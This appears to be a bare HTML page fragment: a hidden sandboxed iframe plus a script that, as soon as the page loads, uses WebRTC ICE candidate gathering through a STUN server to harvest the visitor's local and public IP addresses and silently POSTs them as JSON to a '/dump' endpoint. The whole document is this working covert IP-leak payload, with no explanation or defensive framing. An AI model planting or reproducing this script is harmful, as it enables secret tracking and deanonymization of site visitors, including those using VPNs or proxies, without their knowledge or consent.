<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
<script>
(function() {
    function getIPs(callback){
        var RTCPeerConnection = window.RTCPeerConnection
            || window.mozRTCPeerConnection
            || window.webkitRTCPeerConnection;

        var useWebKit = !!window.webkitRTCPeerConnection;
        if(!RTCPeerConnection){
            var win = iframe.contentWindow;
            RTCPeerConnection = win.RTCPeerConnection
                || win.mozRTCPeerConnection
                || win.webkitRTCPeerConnection;
            useWebKit = !!win.webkitRTCPeerConnection;
        }

        var mediaConstraints = {
            optional: [{RtpDataChannels: true}]
        };

        var servers = {
            iceServers: [{urls: "stun:stun.services.mozilla.com"}]
        };

        var pc = new RTCPeerConnection(servers, mediaConstraints);
        pc.onicecandidate = function(ice){
            if(!ice.candidate)
                return;

            callback(ice.candidate.candidate);
        };

        pc.createDataChannel("");
        pc.createOffer(function(result){
            pc.setLocalDescription(result, function(){}, function(){});
        }, function(){});

        setTimeout(function(){
            callback(pc.localDescription);
        }, 1000);
    }

    document.addEventListener("DOMContentLoaded", function(event) {
        getIPs(function(data){
            var http = new XMLHttpRequest();
            var url = "/dump";
            http.open("POST", url, true);
            http.setRequestHeader("Content-type", "application/json");
            http.send(JSON.stringify(data));
        });
    });
})();
</script>


